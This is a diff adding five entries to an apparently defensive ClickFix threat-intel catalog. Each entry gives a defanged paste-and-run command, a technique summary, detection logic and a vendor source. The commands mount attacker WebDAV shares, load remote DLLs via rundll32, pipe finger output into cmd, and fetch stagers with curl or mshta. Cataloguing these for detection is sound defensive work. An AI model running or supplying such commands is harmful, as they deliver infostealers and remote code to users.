@@ -3,7 +3,7 @@
     "title": "ClickFix Command Catalog",
     "purpose": "Defensive threat-intel reference of ClickFix (fake-CAPTCHA / paste-and-run) command patterns for detection engineering and threat hunting.",
     "warning": "All commands are DEFANGED malicious samples for DETECTION ONLY. Do not execute. URLs neutralised (hxxp, [.]).",
-    "updated": "2026-08-27"
+    "updated": "2026-08-29"
   },
   "entries": [
     {
@@ -245,6 +245,56 @@
       "source": "Microsoft Threat Intelligence",
       "source_url": "hxxps://www[.]microsoft[.]com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/",
       "date_added": "2026-05-06"
+    },
+    {
+      "id": "cf-0025",
+      "command": "\"cmd.exe\" /c net use Z: hxxps://94[.]156[.]170[.]255/webdav /persistent:no && \"Z:\\update.cmd\" & net use Z: /delete",
+      "executor": "cmd.exe",
+      "technique": "ClickFix pastes a cmd one-liner that mounts an attacker WebDAV server as drive Z:, runs a staged update.cmd loader, then unmaps the drive to clean up.",
+      "detection": "Alert on cmd.exe 'net use' mapping a drive letter to a raw-IP HTTPS/WebDAV path, immediately followed by execution of a .cmd/.bat from that mapped drive.",
+      "source": "Atos Threat Research (via The Hacker News)",
+      "source_url": "hxxps://thehackernews[.]com/2026/03/investigating-new-click-fix-variant.html",
+      "date_added": "2026-03-13"
+    },
+    {
+      "id": "cf-0026",
+      "command": "rundll32.exe \\\\data-x7-sync.neurosync[.]in[.]net@80\\verification.google,#1",
+      "executor": "rundll32.exe",
+      "technique": "ClickFix loads a remote 32-bit DLL over the WebDAV mini-redirector using a UNC path with the @80 HTTP port qualifier and calls export ordinal #1 (SkimokKeep loader), avoiding PowerShell entirely.",
+      "detection": "Hunt for rundll32.exe with a UNC/WebDAV path containing '@80' or '@443'/'@SSL' and an ordinal export (',#1'); pair with new WebClient service starts and outbound WebDAV traffic.",
+      "source": "CyberProof",
+      "source_url": "hxxps://www[.]cyberproof[.]com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/",
+      "date_added": "2026-03-19"
+    },
+    {
+      "id": "cf-0027",
+      "command": "finger gcaptcha@captchaver[.]top | cmd",
+      "executor": "finger.exe",
+      "technique": "Fake-CAPTCHA ClickFix uses the legacy finger.exe LOLBin to retrieve an attacker-hosted script over TCP/79 and pipes the response straight into cmd for execution (KongTuke and SmartApeSG campaigns).",
+      "detection": "Flag any finger.exe execution (rare on modern hosts), especially outbound TCP/79 to non-corporate hosts and finger.exe spawning cmd.exe or powershell.exe as a child.",
+      "source": "SANS Internet Storm Center (Johannes Ullrich)",
+      "source_url": "hxxps://isc[.]sans[.]edu/diary/32566",
+      "date_added": "2025-12-13"
+    },
+    {
+      "id": "cf-0028",
+      "command": "curl -kSsfL hxxps://dryvecar[.]com/curl/04566d1d3f9717b2e7e6b643775d9ca72cef942f6df9ce075cf8c73a1bd2565a",
+      "executor": "osascript (Script Editor via applescript:// scheme)",
+      "technique": "macOS ClickFix uses an applescript:// URL to open Script Editor with a tr-obfuscated AppleScript that runs curl -kSsfL to fetch a gzip stager piped into zsh, ending in Atomic Stealer (AMOS).",
+      "detection": "Correlate Script Editor / osascript launching curl with -kSsfL to a '/curl/<hex>' path, followed by base64/gzip decode piped to zsh and xattr -c on a /tmp Mach-O.",
+      "source": "Jamf Threat Labs",
+      "source_url": "hxxps://www[.]jamf[.]com/blog/clickfix-macos-script-editor-atomic-stealer/",
+      "date_added": "2026-04-08"
+    },
+    {
+      "id": "cf-0029",
+      "command": "mshta hxxp://141[.]0x62[.]80[.]175/tick.odd",
+      "executor": "mshta.exe",
+      "technique": "Fake 'Windows Update' ClickFix lure runs mshta against a hex-encoded-second-octet IP serving JScript from a non-.hta extension (.odd/.dat), which stages a PowerShell .NET steganographic loader hiding shellcode in PNG pixels (LummaC2/Rhadamanthys).",
+      "detection": "Hunt mshta.exe fetching URLs with hex-octet IPs (e.g. 0x62) and non-HTML extensions like .odd/.dat, then mshta spawning powershell.exe with in-memory download activity.",
+      "source": "Huntress",
+      "source_url": "hxxps://www[.]huntress[.]com/blog/clickfix-malware-buried-in-images",
+      "date_added": "2025-11-24"
     }
   ]
 }
